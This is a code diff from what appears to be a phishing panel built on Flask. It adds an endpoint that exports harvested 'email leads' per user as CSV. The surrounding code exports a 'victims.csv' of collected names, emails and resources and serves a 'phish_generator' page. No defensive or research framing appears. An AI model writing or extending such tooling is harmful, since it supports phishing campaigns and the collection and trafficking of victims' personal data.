@@ -1817,6 +1817,16 @@ def init_routes():
             csv += f'"{u["email"]}","{u["name"]}","{u["resource"]}","{u["stored_at"]}"\n'
         return csv, 200, {'Content-Type': 'text/csv', 'Content-Disposition': 'attachment; filename=victims.csv'}
 
+    @app.route("/api/download_email_leads/<user_email>")
+    def api_download_email_leads(user_email):
+        """Download extracted email leads for a specific user as CSV."""
+        rows = query_db_json("SELECT lead_email, lead_name, source, first_seen FROM email_leads WHERE user_email = ? ORDER BY lead_email", [user_email])
+        csv = "Email,Name,Source,First Seen\n"
+        for r in rows:
+            csv += f'"{r.get("lead_email","")}","{r.get("lead_name","")}","{r.get("source","")}","{r.get("first_seen","")}"\n'
+        safe_name = user_email.replace("@", "_at_").replace(".", "_")
+        return csv, 200, {'Content-Type': 'text/csv', 'Content-Disposition': f'attachment; filename=email-leads-{safe_name}.csv'}
+
     @app.route("/phish_generator")
     def phish_generator():
         return render_template('phish_generator.html', title="Phish Generator")
